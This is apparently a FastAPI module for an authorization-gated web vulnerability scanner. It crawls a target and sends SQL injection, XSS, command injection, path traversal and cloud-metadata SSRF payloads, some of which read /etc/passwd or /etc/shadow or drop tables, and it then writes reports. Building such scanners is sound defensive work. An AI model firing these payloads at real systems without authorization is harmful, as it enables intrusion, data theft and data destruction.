"""
AI Pentesting Service - DISABLED BY DEFAULT FOR SECURITY
This module provides real vulnerability scanning capabilities.
It is DISABLED by default to prevent abuse.

To enable: Set PENTESTING_ENABLED=true in environment
WARNING: Enabling this without proper authorization can be illegal
"""

from fastapi import APIRouter, HTTPException, BackgroundTasks, UploadFile, File, Header, Request
from pydantic import BaseModel, Field
from typing import List, Optional, Dict, Any
from datetime import datetime
import uuid
import asyncio
import re
import sys
import os
from enum import Enum
from urllib.parse import urlparse, parse_qs, urljoin
import httpx
from bs4 import BeautifulSoup

router = APIRouter(prefix="/pentest", tags=["Pentesting"])

# Security: Disable pentesting by default
PENTESTING_ENABLED = os.getenv("PENTESTING_ENABLED", "false").lower() == "true"
PENTESTING_API_KEY = os.getenv("PENTESTING_API_KEY", "")


def check_pentest_authorization(authorization: Optional[str] = None):
    """Verify authorization for pentesting endpoints"""
    if not PENTESTING_ENABLED:
        raise HTTPException(
            status_code=403,
            detail="Pentesting is disabled. Set PENTESTING_ENABLED=true to enable (not recommended for public servers)."
        )
    
    if not PENTESTING_API_KEY:
        raise HTTPException(
            status_code=500,
            detail="Pentesting is not properly configured. Contact administrator."
        )
    
    if authorization != PENTESTING_API_KEY:
        raise HTTPException(
            status_code=401,
            detail="Invalid authorization"
        )


class ScanStatus(str, Enum):
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    CANCELLED = "cancelled"


class TargetType(str, Enum):
    WEB_APPLICATION = "web_application"
    REST_API = "api"
    SOURCE_CODE = "source_code"
    NETWORK = "network"
    CONTAINER = "container"
    ENTERPRISE_SOFTWARE = "enterprise_software"


class ScanIntensity(str, Enum):
    LIGHT = "light"
    MEDIUM = "medium"
    HEAVY = "heavy"
    MAXIMUM = "maximum"


class Severity(str, Enum):
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class VulnerabilityCategory(str, Enum):
    SQL_INJECTION = "sql_injection"
    XSS = "cross_site_scripting"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    SSRF = "server_side_request_forgery"
    IDOR = "insecure_direct_object_reference"
    XXE = "xml_external_entity"
    AUTHENTICATION = "authentication_bypass"
    SENSITIVE_DATA = "sensitive_data_exposure"
    SECURITY_MISCONFIG = "security_misconfiguration"


class PentestScan(BaseModel):
    scan_id: str
    target: str
    target_type: TargetType
    status: ScanStatus = ScanStatus.PENDING
    progress: int = 0
    current_phase: str = ""
    started_at: Optional[datetime] = None
    completed_at: Optional[datetime] = None
    findings: List[Dict[str, Any]] = []
    vulnerabilities_found: int = 0
    pages_scanned: int = 0
    requests_made: int = 0


class VulnerabilityFinding(BaseModel):
    finding_id: str
    name: str
    description: str
    severity: Severity
    confidence: float = Field(ge=0, le=100)
    category: str
    location: str
    cwe_id: Optional[str] = None
    cvss_score: Optional[float] = None
    evidence: Optional[str] = None
    remediation: Optional[str] = None
    request_sent: Optional[str] = None
    response_snippet: Optional[str] = None


class ScanConfig(BaseModel):
    target: str
    target_type: TargetType = TargetType.WEB_APPLICATION
    auth_type: Optional[str] = "none"
    credentials: Optional[str] = None
    intensity: ScanIntensity = ScanIntensity.MEDIUM
    use_zero_day_detection: bool = True
    exploitability_analysis: bool = True
    generate_poc: bool = False
    max_requests: int = 1000
    timeout: int = 30


class RealVulnerabilityScanner:
    """Real vulnerability scanner that performs actual security testing"""
    
    def __init__(self, config: ScanConfig):
        self.config = config
        self.findings: List[VulnerabilityFinding] = []
        self.pages_scanned = 0
        self.requests_made = 0
        self.scanned_urls = set()
        self.forms_found = []
        
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "1' AND '1'='1",
            "1' AND '1'='1' --",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "1' ORDER BY 1--",
            "1' ORDER BY 10--",
            "1' ORDER BY 100--",
            "' OR 1=1--",
            "admin'--",
            "1' AND SLEEP(5)--",
            "1'; WAITFOR DELAY '00:00:05'--",
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<svg><animate onbegin=alert('XSS') attributeName=x>",
            "{{constructor.constructor('alert(1)')()}}",
            "${alert('XSS')}",
        ]
        
        self.cmd_payloads = [
            "; ls -la",
            "| ls -la",
            "& ls -la",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; id",
            "| id",
        ]
        
        self.path_payloads = [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "/etc/shadow",
            "/var/www/html/config.php",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
        
        self.ssrf_payloads = [
            "http://localhost",
            "http://127.0.0.1",
            "http://[::1]",
            "http://metadata.google.internal",
            "http://169.254.169.254",
            "file:///etc/passwd",
        ]

    async def scan(self) -> List[VulnerabilityFinding]:
        """Main scanning method"""
        try:
            async with httpx.AsyncClient(
                timeout=httpx.Timeout(self.config.timeout),
                follow_redirects=True,
                verify=True
            ) as client:
                self.client = client
                
                # Phase 1: Reconnaissance
                await self.phase_reconnaissance()
                
                # Phase 2: Crawl and discover
                await self.phase_crawl()
                
                # Phase 3: Test for vulnerabilities
                await self.phase_vulnerability_tests()
                
                # Phase 4: Analyze findings
                await self.phase_analysis()
                
        except Exception as e:
            print(f"Scanner error: {e}", file=sys.stderr)
            
        return self.findings

    async def phase_reconnaissance(self):
        """Phase 1: Initial reconnaissance"""
        try:
            # Test if target is reachable
            response = await self.client.get(self.config.target)
            self.requests_made += 1
            
            self.target_info = {
                "status_code": response.status_code,
                "server": response.headers.get("server", "Unknown"),
                "content_type": response.headers.get("content-type", ""),
                "powered_by": response.headers.get("x-powered-by", ""),
            }
            
            # Extract forms for testing
            if "text/html" in response.headers.get("content-type", ""):
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                self.forms_found = [
                    {
                        "action": form.get('action', ''),
                        "method": form.get('method', 'get').upper(),
                        "inputs": [{"name": i.get('name'), "type": i.get('type', 'text')} for i in form.find_all(['input', 'textarea'])]
                    }
                    for form in forms
                ]
                
        except Exception as e:
            print(f"Reconnaissance error: {e}", file=sys.stderr)

    async def phase_crawl(self):
        """Phase 2: Crawl the target"""
        try:
            # Add initial URL to crawl queue
            to_crawl = [self.config.target]
            crawled = set()
            
            max_pages = 10 if self.config.intensity == ScanIntensity.LIGHT else 50
            
            while to_crawl and self.pages_scanned < max_pages:
                url = to_crawl.pop(0)
                if url in crawled:
                    continue
                    
                crawled.add(url)
                
                try:
                    response = await self.client.get(url)
                    self.requests_made += 1
                    self.pages_scanned += 1
                    
                    if "text/html" in response.headers.get("content-type", ""):
                        soup = BeautifulSoup(response.text, 'html.parser')
                        
                        # Find links
                        for link in soup.find_all('a', href=True):
                            href = link['href']
                            full_url = urljoin(url, href)
                            if full_url.startswith(self.config.target) and full_url not in crawled:
                                to_crawl.append(full_url)
                                
                except Exception:
                    pass
                    
        except Exception as e:
            print(f"Crawl error: {e}", file=sys.stderr)

    async def phase_vulnerability_tests(self):
        """Phase 3: Test for vulnerabilities"""
        
        # Test for SQL Injection
        await self.test_sql_injection()
        
        # Test for XSS
        await self.test_xss()
        
        # Test for Command Injection
        await self.test_command_injection()
        
        # Test for Path Traversal
        await self.test_path_traversal()
        
        # Test for SSRF
        await self.test_ssrf()

    async def test_sql_injection(self):
        """Test for SQL Injection vulnerabilities"""
        try:
            # Test query parameters
            parsed = urlparse(self.config.target)
            params = parse_qs(parsed.query)
            
            for param_name in params.keys():
                for payload in self.sql_payloads[:5]:  # Limit payloads
                    if self.requests_made >= self.config.max_requests:
                        return
                        
                    test_url = self.config.target.replace(
                        f"{param_name}={params[param_name][0]}",
                        f"{param_name}={payload}"
                    )
                    
                    try:
                        response = await self.client.get(test_url)
                        self.requests_made += 1
                        
                        if self._detect_sql_error(response.text):
                            self.findings.append(VulnerabilityFinding(
                                finding_id=f"SQL-{uuid.uuid4().hex[:8].upper()}",
                                name="SQL Injection Vulnerability",
                                description=f"Parameter '{param_name}' appears vulnerable to SQL injection. "
                                          f"Payload: {payload}",
                                severity=Severity.CRITICAL,
                                confidence=85,
                                category=VulnerabilityCategory.SQL_INJECTION.value,
                                location=f"{self.config.target}?{param_name}=[INJECTED]",
                                cwe_id="CWE-89",
                                cvss_score=9.8,
                                evidence=f"Error detected in response: {self._extract_error(response.text)[:200]}",
                                remediation="Use parameterized queries (prepared statements) instead of string concatenation. "
                                           "Validate and sanitize all user input.",
                                request_sent=test_url,
                                response_snippet=response.text[:200]
                            ))
                            break  # Found vulnerability, move to next param
                            
                    except Exception:
                        pass
                        
            # Test forms
            for form in self.forms_found[:3]:
                for input_field in form.get('inputs', [])[:3]:
                    if not input_field.get('name'):
                        continue
                        
                    for payload in self.sql_payloads[:3]:
                        if self.requests_made >= self.config.max_requests:
                            return
                            
                        try:
                            data = {input_field['name']: payload}
                            method = form.get('method', 'GET')
                            action = urljoin(self.config.target, form.get('action', ''))
                            
                            if method == 'POST':
                                response = await self.client.post(action, data=data)
                            else:
                                response = await self.client.get(action, params=data)
                                
                            self.requests_made += 1
                            
                            if self._detect_sql_error(response.text):
                                self.findings.append(VulnerabilityFinding(
                                    finding_id=f"SQL-{uuid.uuid4().hex[:8].upper()}",
                                    name="SQL Injection in Form",
                                    description=f"Form field '{input_field['name']}' is vulnerable to SQL injection",
                                    severity=Severity.CRITICAL,
                                    confidence=80,
                                    category=VulnerabilityCategory.SQL_INJECTION.value,
                                    location=f"{action} (form field: {input_field['name']})",
                                    cwe_id="CWE-89",
                                    cvss_score=9.8,
                                    remediation="Use parameterized queries for form inputs"
                                ))
                                break
                                
                        except Exception:
                            pass
                            
        except Exception as e:
            print(f"SQL injection test error: {e}", file=sys.stderr)

    async def test_xss(self):
        """Test for Cross-Site Scripting (XSS) vulnerabilities"""
        try:
            # Test query parameters
            parsed = urlparse(self.config.target)
            params = parse_qs(parsed.query)
            
            for param_name in params.keys():
                for payload in self.xss_payloads[:5]:
                    if self.requests_made >= self.config.max_requests:
                        return
                        
                    test_url = self.config.target.replace(
                        f"{param_name}={params[param_name][0]}",
                        f"{param_name}={payload}"
                    )
                    
                    try:
                        response = await self.client.get(test_url)
                        self.requests_made += 1
                        
                        # Check if payload is reflected without encoding
                        if payload in response.text:
                            self.findings.append(VulnerabilityFinding(
                                finding_id=f"XSS-{uuid.uuid4().hex[:8].upper()}",
                                name="Cross-Site Scripting (XSS)",
                                description=f"Parameter '{param_name}' is vulnerable to reflected XSS. "
                                          f"Payload reflected without encoding.",
                                severity=Severity.HIGH,
                                confidence=90,
                                category=VulnerabilityCategory.XSS.value,
                                location=f"{self.config.target}?{param_name}=[INJECTED]",
                                cwe_id="CWE-79",
                                cvss_score=7.3,
                                evidence=f"Payload '{payload}' reflected in response",
                                remediation="Implement output encoding, use Content Security Policy (CSP), "
                                           "and validate/sanitize all user input.",
                                request_sent=test_url,
                            ))
                            break
                            
                        # Check for script tag execution
                        if "<script>" in response.text.lower() or "onerror=" in response.text:
                            self.findings.append(VulnerabilityFinding(
                                finding_id=f"XSS-{uuid.uuid4().hex[:8].upper()}",
                                name="Cross-Site Scripting (XSS)",
                                description=f"Possible XSS in parameter '{param_name}'",
                                severity=Severity.HIGH,
                                confidence=75,
                                category=VulnerabilityCategory.XSS.value,
                                location=f"{self.config.target}?{param_name}=[INJECTED]",
                                cwe_id="CWE-79",
                                cvss_score=7.3,
                                remediation="Sanitize and encode user input before rendering"
                            ))
                            break
                            
                    except Exception:
                        pass
                        
        except Exception as e:
            print(f"XSS test error: {e}", file=sys.stderr)

    async def test_command_injection(self):
        """Test for Command Injection vulnerabilities"""
        try:
            parsed = urlparse(self.config.target)
            params = parse_qs(parsed.query)
            
            for param_name in params.keys():
                for payload in self.cmd_payloads[:3]:
                    if self.requests_made >= self.config.max_requests:
                        return
                        
                    # URL encode the payload
                    encoded_payload = payload.replace(" ", "%20")
                    test_url = self.config.target.replace(
                        f"{param_name}={params[param_name][0]}",
                        f"{param_name}={encoded_payload}"
                    )
                    
                    try:
                        response = await self.client.get(test_url, timeout=5)
                        self.requests_made += 1
                        
                        # Check for command output in response
                        if any(indicator in response.text.lower() for indicator in 
                               ['root:', 'bin/bash', 'uid=', 'www-data', 'permission denied', 'command not found']):
                            self.findings.append(VulnerabilityFinding(
                                finding_id=f"CMD-{uuid.uuid4().hex[:8].upper()}",
                                name="Command Injection",
                                description=f"Parameter '{param_name}' may be vulnerable to OS command injection",
                                severity=Severity.CRITICAL,
                                confidence=70,
                                category=VulnerabilityCategory.COMMAND_INJECTION.value,
                                location=f"{self.config.target}?{param_name}=[INJECTED]",
                                cwe_id="CWE-78",
                                cvss_score=10.0,
                                evidence="Command output detected in response",
                                remediation="Never use user input in system commands. Use parameterized APIs instead.",
                                request_sent=test_url,
                            ))
                            break
                            
                    except Exception:
                        pass
                        
        except Exception as e:
            print(f"Command injection test error: {e}", file=sys.stderr)

    async def test_path_traversal(self):
        """Test for Path Traversal vulnerabilities"""
        try:
            parsed = urlparse(self.config.target)
            params = parse_qs(parsed.query)
            
            for param_name in params.keys():
                for payload in self.path_payloads[:5]:
                    if self.requests_made >= self.config.max_requests:
                        return
                        
                    test_url = self.config.target.replace(
                        f"{param_name}={params[param_name][0]}",
                        f"{param_name}={payload}"
                    )
                    
                    try:
                        response = await self.client.get(test_url)
                        self.requests_made += 1
                        
                        # Check for sensitive file content
                        if any(indicator in response.text for indicator in 
                               ['root:', '[boot loader]', 'windows', '[extensions]']):
                            self.findings.append(VulnerabilityFinding(
                                finding_id=f"PATH-{uuid.uuid4().hex[:8].upper()}",
                                name="Path Traversal",
                                description=f"Parameter '{param_name}' allows reading arbitrary files",
                                severity=Severity.HIGH,
                                confidence=85,
                                category=VulnerabilityCategory.PATH_TRAVERSAL.value,
                                location=f"{self.config.target}?{param_name}=[INJECTED]",
                                cwe_id="CWE-22",
                                cvss_score=8.2,
                                evidence="Sensitive file content detected in response",
                                remediation="Validate and sanitize file paths. Use allowlists. "
                                           "Prevent directory traversal with proper path normalization.",
                                request_sent=test_url,
                            ))
                            break
                            
                    except Exception:
                        pass
                        
        except Exception as e:
            print(f"Path traversal test error: {e}", file=sys.stderr)

    async def test_ssrf(self):
        """Test for Server-Side Request Forgery (SSRF)"""
        try:
            parsed = urlparse(self.config.target)
            params = parse_qs(parsed.query)
            
            for param_name in params.keys():
                for payload in self.ssrf_payloads[:4]:
                    if self.requests_made >= self.config.max_requests:
                        return
                        
                    test_url = self.config.target.replace(
                        f"{param_name}={params[param_name][0]}",
                        f"{param_name}={payload}"
                    )
                    
                    try:
                        response = await self.client.get(test_url, timeout=10)
                        self.requests_made += 1
                        
                        # Check for SSRF indicators
                        if any(indicator in response.text.lower() for indicator in 
                               ['localhost', '127.0.0.1', 'metadata', 'internal']):
                            # Could be SSRF but needs more investigation
                            self.findings.append(VulnerabilityFinding(
                                finding_id=f"SSRF-{uuid.uuid4().hex[:8].upper()}",
                                name="Potential Server-Side Request Forgery",
                                description=f"Parameter '{param_name}' may allow SSRF attacks",
                                severity=Severity.MEDIUM,
                                confidence=60,
                                category=VulnerabilityCategory.SSRF.value,
                                location=f"{self.config.target}?{param_name}=[INJECTED]",
                                cwe_id="CWE-918",
                                cvss_score=6.5,
                                remediation="Validate URLs against allowlists. Disable unnecessary URL schemas.",
                                request_sent=test_url,
                            ))
                            break
                            
                    except Exception:
                        pass
                        
        except Exception as e:
            print(f"SSRF test error: {e}", file=sys.stderr)

    async def phase_analysis(self):
        """Phase 4: Analyze and consolidate findings"""
        # Remove duplicate findings
        unique_findings = []
        seen_locations = set()
        
        for finding in self.findings:
            key = f"{finding.category}:{finding.location}"
            if key not in seen_locations:
                seen_locations.add(key)
                unique_findings.append(finding)
        
        self.findings = unique_findings

    def _detect_sql_error(self, text: str) -> bool:
        """Detect SQL errors in response"""
        sql_errors = [
            "mysql_fetch",
            "sql syntax",
            "ORA-",
            "postgresql",
            "sqlite3",
            "microsoft sql native error",
            "ODBC",
            "sqlserver",
            "unterminated",
            "mysql_num_rows",
            "sqlstate",
            "Warning: mysql",
            "MySQLSyntaxErrorException",
            "valid MySQL result",
            "check the manual",
        ]
        text_lower = text.lower()
        return any(err in text_lower for err in sql_errors)

    def _extract_error(self, text: str) -> str:
        """Extract error message from response"""
        # Find SQL error patterns
        patterns = [
            r"(MySQL|SQL|PostgreSQL|Oracle).*?error",
            r"Warning.*?in.*?line",
            r"Unterminated.*?string",
        ]
        for pattern in patterns:
            match = re.search(pattern, text, re.IGNORECASE)
            if match:
                return match.group(0)
        return text[:100]


active_scans: Dict[str, PentestScan] = {}


@router.post("/start-scan", response_model=PentestScan)
async def start_pentest_scan(
    config: ScanConfig,
    background_tasks: BackgroundTasks,
    authorization: Optional[str] = Header(None)
):
    """Start a new pentest scan with real vulnerability detection
    WARNING: This endpoint is DISABLED by default. Set PENTESTING_ENABLED=true to enable.
    """
    # Security check - verify pentesting is enabled and authorized
    check_pentest_authorization(authorization)
    
    if not config.target:
        raise HTTPException(status_code=400, detail="Target is required")
    
    # Validate URL
    if not config.target.startswith(('http://', 'https://')):
        config.target = 'http://' + config.target
    
    # Set intensity-based limits
    intensity_limits = {
        ScanIntensity.LIGHT: 100,
        ScanIntensity.MEDIUM: 500,
        ScanIntensity.HEAVY: 1000,
        ScanIntensity.MAXIMUM: 5000,
    }
    config.max_requests = intensity_limits.get(config.intensity, 500)
    
    # Note: Authorization is already checked by check_pentest_authorization()
    
    scan_id = f"SCAN-{uuid.uuid4().hex.upper()}"
    
    scan = PentestScan(
        scan_id=scan_id,
        target=config.target,
        target_type=config.target_type,
        status=ScanStatus.RUNNING,
        progress=0,
        current_phase="Initializing",
        started_at=datetime.now()
    )
    
    active_scans[scan_id] = scan
    
    # Log scan start
    print(f"ðŸ”  SCAN STARTED: {scan_id} | Target: {config.target} | Intensity: {config.intensity.value}")
    
    background_tasks.add_task(run_pentest_scan, scan_id, config)
    
    return scan


async def run_pentest_scan(scan_id: str, config: ScanConfig):
    """Execute the real pentest scan with audit logging"""
    
    scan = active_scans.get(scan_id)
    if not scan:
        return
    
    try:
        scan.current_phase = "Reconnaissance"
        scan.progress = 10
        
        print(f"ðŸ“¡  {scan_id}: Starting reconnaissance on {config.target}")
        
        scanner = RealVulnerabilityScanner(config)
        
        # Run scan
        findings = await scanner.scan()
        
        scan.current_phase = "Analyzing Results"
        scan.progress = 90
        
        scan.findings = []
        critical_count = 0
        high_count = 0
        
        for f in findings:
            f_dict = f.dict()
            scan.findings.append(f_dict)
            if f.severity == Severity.CRITICAL:
                critical_count += 1
            elif f.severity == Severity.HIGH:
                high_count += 1
        
        scan.vulnerabilities_found = len(findings)
        scan.pages_scanned = scanner.pages_scanned
        scan.requests_made = scanner.requests_made
        
        scan.status = ScanStatus.COMPLETED
        scan.completed_at = datetime.now()
        scan.progress = 100
        scan.current_phase = "Completed"
        
        # Summary log
        print(f"âœ…  {scan_id}: Scan completed | Vulnerabilities: {len(findings)} (Critical: {critical_count}, High: {high_count}) | Requests: {scan.requests_made}")
        
    except Exception as e:
        scan.status = ScanStatus.FAILED
        scan.current_phase = f"Error: {str(e)}"
        scan.completed_at = datetime.now()
        print(f"âŒ  {scan_id}: Scan failed - {str(e)}")


@router.get("/scan/{scan_id}", response_model=PentestScan)
async def get_scan_status(scan_id: str, authorization: Optional[str] = Header(None)):
    """Get the status of a pentest scan"""
    check_pentest_authorization(authorization)
    
    if scan_id not in active_scans:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    return active_scans[scan_id]


@router.get("/scans")
async def list_scans(authorization: Optional[str] = Header(None)):
    """List all pentest scans"""
    check_pentest_authorization(authorization)
    
    return list(active_scans.values())


@router.get("/scan/{scan_id}/findings")
async def get_scan_findings(scan_id: str, authorization: Optional[str] = Header(None)):
    """Get all findings for a completed scan"""
    check_pentest_authorization(authorization)
    
    if scan_id not in active_scans:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    scan = active_scans[scan_id]
    
    return {
        "scan_id": scan_id,
        "total_findings": len(scan.findings),
        "by_severity": _count_by_severity(scan.findings),
        "findings": scan.findings,
        "pages_scanned": scan.pages_scanned,
        "requests_made": scan.requests_made,
    }


def _count_by_severity(findings: List[Dict]) -> Dict[str, int]:
    counts = {"critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0}
    for f in findings:
        severity = f.get("severity", "").lower()
        if severity in counts:
            counts[severity] += 1
    return counts


@router.post("/scan/{scan_id}/stop")
async def stop_scan(scan_id: str, authorization: Optional[str] = Header(None)):
    """Stop a running pentest scan"""
    check_pentest_authorization(authorization)
    
    if scan_id not in active_scans:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    scan = active_scans[scan_id]
    if scan.status == ScanStatus.RUNNING:
        scan.status = ScanStatus.CANCELLED
        scan.completed_at = datetime.now()
    
    return {"message": "Scan stopped", "scan_id": scan_id}


@router.get("/zero-day-threats")
async def get_zero_day_threats(authorization: Optional[str] = Header(None)):
    """Get known 0-day threat intelligence"""
    check_pentest_authorization(authorization)
    
    return {
        "known_threats": [
            {
                "threat_id": "ZD-2024-001",
                "name": "Log4j Remote Code Execution",
                "cve": "CVE-2021-44228",
                "severity": "critical",
                "affected_products": ["Apache Log4j"],
                "detection_available": True
            },
            {
                "threat_id": "ZD-2024-002",
                "name": "Spring Framework RCE",
                "cve": "CVE-2022-22965",
                "severity": "critical",
                "affected_products": ["Spring Framework"],
                "detection_available": True
            }
        ],
        "scanner_version": "DevGuardian-Scan-v1.0",
        "last_updated": datetime.now().isoformat()
    }


@router.get("/scan/{scan_id}/report")
async def generate_report(scan_id: str, format: str = "json", authorization: Optional[str] = Header(None)):
    """Generate a compliance report with evidence preservation"""
    check_pentest_authorization(authorization)
    
    if scan_id not in active_scans:
        raise HTTPException(status_code=404, detail="Scan not found")
    
    scan = active_scans[scan_id]
    
    # Generate unique report ID
    report_id = f"REPORT-{scan_id}-{uuid.uuid4().hex.upper()}"
    
    # Generate HMAC signature for integrity verification
    import hmac
    import hashlib
    
    secret_key = os.getenv("REPORT_SIGNING_KEY", "default-dev-key-change-in-production")
    scan_data = f"{scan_id}{scan.target}{scan.status}{scan.completed_at}"
    signature = hmac.new(
        secret_key.encode(),
        scan_data.encode(),
        hashlib.sha256
    ).hexdigest()
    
    # Build comprehensive report
    report = {
        "report_id": report_id,
        "generated_at": datetime.now().isoformat(),
        "scanner_version": "DevGuardian-Enterprise-v1.0",
        
        # Executive Summary
        "executive_summary": {
            "target": scan.target,
            "scan_type": scan.target_type.value if hasattr(scan.target_type, 'value') else scan.target_type,
            "status": scan.status.value if hasattr(scan.status, 'value') else scan.status,
            "duration": (scan.completed_at - scan.started_at).total_seconds() if scan.started_at and scan.completed_at else None,
            "total_findings": len(scan.findings),
            "critical_count": sum(1 for f in scan.findings if f.get('severity') == 'critical'),
            "high_count": sum(1 for f in scan.findings if f.get('severity') == 'high'),
            "risk_rating": _calculate_risk_rating(scan.findings)
        },
        
        # Technical Details
        "technical_details": {
            "scan_id": scan.scan_id,
            "target": scan.target,
            "target_type": scan.target_type.value if hasattr(scan.target_type, 'value') else scan.target_type,
            "started_at": scan.started_at.isoformat() if scan.started_at else None,
            "completed_at": scan.completed_at.isoformat() if scan.completed_at else None,
            "pages_scanned": scan.pages_scanned,
            "requests_made": scan.requests_made,
            "current_phase": scan.current_phase,
        },
        
        # Findings by Severity
        "findings_summary": {
            "critical": [f for f in scan.findings if f.get('severity') == 'critical'],
            "high": [f for f in scan.findings if f.get('severity') == 'high'],
            "medium": [f for f in scan.findings if f.get('severity') == 'medium'],
            "low": [f for f in scan.findings if f.get('severity') == 'low'],
        },
        
        # Full Findings
        "findings": scan.findings,
        
        # Remediation
        "remediation_plan": _generate_remediation_plan(scan.findings),
        
        # Evidence Chain
        "evidence_chain": {
            "scan_initiated": scan.started_at.isoformat() if scan.started_at else None,
            "scan_completed": scan.completed_at.isoformat() if scan.completed_at else None,
            "total_requests": scan.requests_made,
            "pages_analyzed": scan.pages_scanned,
        },
        
        # Integrity Verification
        "integrity": {
            "signature_algorithm": "HMAC-SHA256",
            "signature": signature,
            "verification_method": "Use HMAC verification with shared secret key",
            "report_id": report_id
        },
        
        # Compliance
        "compliance": {
            "standards": ["OWASP Top 10", "CWE", "CVSS 3.1"],
            "methodology": "Automated vulnerability scanning with AI-assisted analysis",
            "limitations": "This report provides a point-in-time assessment. Results may vary with code changes.",
            "recommendations": "Regular scanning and manual penetration testing recommended for comprehensive security."
        }
    }
    
    # Format output
    if format == "json":
        return report
    elif format == "summary":
        return {
            "report_id": report_id,
            "executive_summary": report["executive_summary"],
            "risk_rating": report["executive_summary"]["risk_rating"],
            "critical_findings": len(report["findings_summary"]["critical"]),
            "generated_at": report["generated_at"]
        }
    else:
        raise HTTPException(status_code=400, detail="Unsupported format. Use 'json' or 'summary'.")


def _calculate_risk_rating(findings: List[Dict]) -> str:
    """Calculate overall risk rating based on findings"""
    critical = sum(1 for f in findings if f.get('severity') == 'critical')
    high = sum(1 for f in findings if f.get('severity') == 'high')
    medium = sum(1 for f in findings if f.get('severity') == 'medium')
    
    if critical > 0:
        return "CRITICAL"
    elif high > 3:
        return "HIGH"
    elif high > 0 or medium > 5:
        return "MEDIUM"
    elif medium > 0:
        return "LOW"
    else:
        return "MINIMAL"


def _generate_remediation_plan(findings: List[Dict]) -> Dict[str, Any]:
    """Generate prioritized remediation plan"""
    
    # Group by category
    categories = {}
    for f in findings:
        cat = f.get('category', 'other')
        if cat not in categories:
            categories[cat] = []
        categories[cat].append({
            "finding": f.get('name'),
            "severity": f.get('severity'),
            "location": f.get('location'),
            "remediation": f.get('remediation', 'No specific remediation provided.')
        })
    
    # Priority order
    priority_order = ['sql_injection', 'command_injection', 'xss', 'ssrf', 'path_traversal']
    
    prioritized = []
    for cat in priority_order:
        if cat in categories:
            prioritized.extend(categories[cat])
    
    # Add others
    for cat, items in categories.items():
        if cat not in priority_order:
            prioritized.extend(items)
    
    return {
        "total_issues": len(findings),
        "by_priority": prioritized,
        "estimated_effort": _estimate_remediation_effort(findings)
    }


def _estimate_remediation_effort(findings: List[Dict]) -> Dict[str, str]:
    """Estimate remediation effort"""
    critical = sum(1 for f in findings if f.get('severity') == 'critical')
    high = sum(1 for f in findings if f.get('severity') == 'high')
    
    if critical > 0:
        return {"level": "URGENT", "description": "Immediate action required"}
    elif high > 5:
        return {"level": "HIGH", "description": "Address within 1 week"}
    elif high > 0:
        return {"level": "MEDIUM", "description": "Address within 1 month"}
    else:
        return {"level": "LOW", "description": "Schedule for next sprint"}
